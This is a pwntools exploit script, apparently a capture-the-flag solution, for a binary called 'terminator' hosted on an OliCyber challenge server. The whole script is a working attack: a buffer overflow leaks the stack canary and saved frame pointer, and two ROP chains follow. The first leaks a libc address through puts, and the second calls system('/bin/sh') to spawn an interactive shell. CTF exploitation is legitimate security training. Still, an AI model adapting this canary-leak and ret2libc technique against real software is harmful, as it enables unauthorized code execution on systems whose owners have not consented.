#!/usr/bin/env python3

from pwn import *

elf = ELF("./terminator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("terminator.challs.olicyber.it", 10307)
    elif args.GDB:
        r = gdb.debug(elf.path, gdbscript=""" 
                      b *welcome+111
                      c
                      """)
    else:
        r = process([elf.path])

    return r


def main():
    r = conn()

    r.sendafter(b'> ', b'a'*56)
    r.recvline()
    
    leak = r.recvuntil(b'Nice to meet you!', drop=True)
    canary = u64(leak[:7].rjust(8, b'\x00'))
    rbp = u64(leak[7:].ljust(8, b'\x00'))
    current_rbp = rbp - 0x20
    
    if(rbp == 0):
        log.error("Rerun")
        exit(1)
    
    log.success(f"Canary: {hex(canary)}")
    log.success(f"RBP: {hex(rbp)}")
    log.success(f"Current RBP: {hex(current_rbp)}")
    
    payload = flat([
        0x401016, # ret, stack alignment
        0x4012fb,  # pop rdi; ret
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],
        b'a' * 16,
        canary,
        current_rbp - 0x48,
        ])
    
    r.sendafter(b'> ', payload)
    
    r.recvline()
    puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
    libc.address = puts_addr - libc.sym['puts']

    log.success(f"puts_addr: {hex(puts_addr)}")
    log.success(f"libc base: {hex(libc.address)}")
    
    r.sendafter(b'> ', b'a'*56)
    r.recvline()
    
    leak = r.recvuntil(b'Nice to meet you!', drop=True)
    rbp = u64(leak[7:].ljust(8, b'\x00'))
    current_rbp = rbp - 0x20
    
    if(rbp == 0):
        log.error("Rerun")
        exit(1)
    
    log.success(f"RBP: {hex(rbp)}")
    log.success(f"Current RBP: {hex(current_rbp)}")
        
    payload = flat([
        b'/bin/sh\x00',
        0x401016, # ret, stack alignment
        0x4012fb,  # pop rdi; ret
        current_rbp - 0x40,
        libc.sym['system'],
        b'a' * 16,
        canary,
        current_rbp - 0x40,
    ])
    
    r.sendafter(b'> ', payload)
    
    r.interactive()


if __name__ == "__main__":
    main()
